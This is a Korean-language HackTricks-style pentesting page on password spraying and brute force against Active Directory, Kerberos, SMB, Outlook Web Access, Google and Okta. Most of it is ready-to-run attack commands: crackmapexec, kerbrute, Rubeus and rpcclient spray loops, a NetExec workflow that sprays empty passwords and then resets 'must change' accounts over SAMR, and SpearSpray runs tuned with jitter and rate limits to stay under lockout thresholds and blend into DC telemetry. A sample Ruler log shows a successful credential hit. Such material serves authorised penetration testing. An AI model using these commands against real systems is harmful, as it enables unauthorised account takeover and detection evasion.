# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

일단 여러 개의 **valid usernames**를 찾으면, 발견한 각 사용자에 대해 가장 흔한 **common passwords**를 시도해볼 수 있습니다(환경의 password policy를 염두에 두세요).\
기본적으로 **default** **minimum** **password** **length**는 **7**입니다.

일반적인 **usernames** 목록도 유용할 수 있습니다: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

여러 번 잘못된 **passwords**를 시도하면 일부 계정이 **lockout**될 수 있다는 점에 유의하세요(기본값은 대략 10회 초과).

### Get password policy

domain user로서 user credentials나 shell이 있다면 다음과 같이 **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux(또는 모든 플랫폼)에서의 Exploitation

- **crackmapexec** 사용:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) 사용 (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(잠금 방지를 위해 시도 횟수를 지정할 수 있습니다):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) 사용 (python) - 권장하지 않음. 가끔 작동하지 않음
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit**의 `scanner/smb/smb_login` 모듈을 사용하여:

![](<../../images/image (745).png>)

- **rpcclient**를 사용하여:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows에서

- brute module이 포함된 버전의 [Rubeus](https://github.com/Zer1t0/Rubeus)로:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (기본적으로 도메인에서 사용자 목록을 생성할 수 있으며 도메인으로부터 암호 정책을 가져와 그에 따라 시도 횟수를 제한합니다):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)를 사용하여
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon" 계정 식별 및 탈취 (SAMR)

저소음 기법으로는 spray a benign/empty password를 시도하여 STATUS_PASSWORD_MUST_CHANGE를 반환하는 계정을 포착하는 것이다. 이는 비밀번호가 강제로 만료되어 이전 비밀번호를 모른 채로 변경할 수 있음을 나타낸다.

작업 흐름:
- 사용자 열거 (RID brute via SAMR)로 대상 목록을 구성:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- 빈 password로 스프레이하고, hits가 나오면 계속 진행해 'must change at next logon' 상태인 계정을 캡처하세요:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 각 hit에 대해, NetExec’s module로 SAMR을 통해 비밀번호를 변경하세요 (계정에 "must change"가 설정되어 있으면 이전 비밀번호가 필요 없습니다):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
운영 참고:
- Kerberos 기반 작업을 수행하기 전에 호스트의 시계가 DC와 동기화되어 있는지 확인하세요: `sudo ntpdate <dc_fqdn>`.
- 일부 모듈(e.g., RDP/WinRM)에서 (Pwn3d!)가 없는 [+] 표시는 creds가 유효하지만 계정에 인터랙티브 로그온 권한이 없음을 의미합니다.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying는 SMB/NTLM/LDAP 바인드 시도에 비해 노이즈를 줄이고 AD 잠금 정책과 더 잘 맞습니다. SpearSpray는 LDAP 기반 타깃팅, 패턴 엔진, 그리고 정책 인식(도메인 정책 + PSOs + badPwdCount 버퍼)을 결합하여 정밀하고 안전하게 스프레이합니다. 또한 손상된 principals를 Neo4j에 태그하여 BloodHound 경로 분석에 사용할 수 있습니다.

Key ideas:
- 페이징 및 LDAPS 지원을 포함한 LDAP 사용자 검색(선택적으로 사용자 정의 LDAP 필터 사용 가능).
- 도메인 잠금 정책 + PSO 인식 필터링을 통해 설정 가능한 시도 버퍼(임계값)를 남겨 사용자 잠금을 방지.
- 빠른 gssapi 바인딩을 사용하는 Kerberos pre-auth 검증(DCs에서 4625 대신 4768/4771 생성).
- 이름과 같은 변수 및 각 사용자의 pwdLastSet에서 파생된 시간 값을 사용한 패턴 기반 사용자별 비밀번호 생성.
- 스레드, 지터, 초당 최대 요청 수로 처리량 제어.
- 선택적 Neo4j 통합으로 소유한 사용자를 표시하여 BloodHound에 활용.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
타겟팅 및 패턴 제어:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
은밀성 및 안전 통제:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound 데이터 보강:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
패턴 시스템 개요 (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

운영 노트:
- 가장 권위 있는 badPwdCount 및 정책 관련 정보를 읽기 위해 -dc로 PDC-emulator를 조회하는 것을 권장합니다.
- badPwdCount 재설정은 관찰 창(observation window) 이후 다음 시도에서 트리거됩니다; 안전을 위해 임계값과 타이밍을 사용하세요.
- Kerberos pre-auth 시도가 DC telemetry에서 4768/4771로 표시됩니다; 섞여들어가기 위해 jitter 및 rate-limiting을 사용하세요.

> 팁: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

p**assword spraying outlook**에 사용할 수 있는 여러 도구들이 있습니다.

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) 사용
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) 사용
- [Ruler](https://github.com/sensepost/ruler) (신뢰할 수 있음!)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

이 도구들을 사용하려면 사용자 목록과 spray할 password 또는 소규모 password 목록이 필요합니다.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## 참고 자료

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
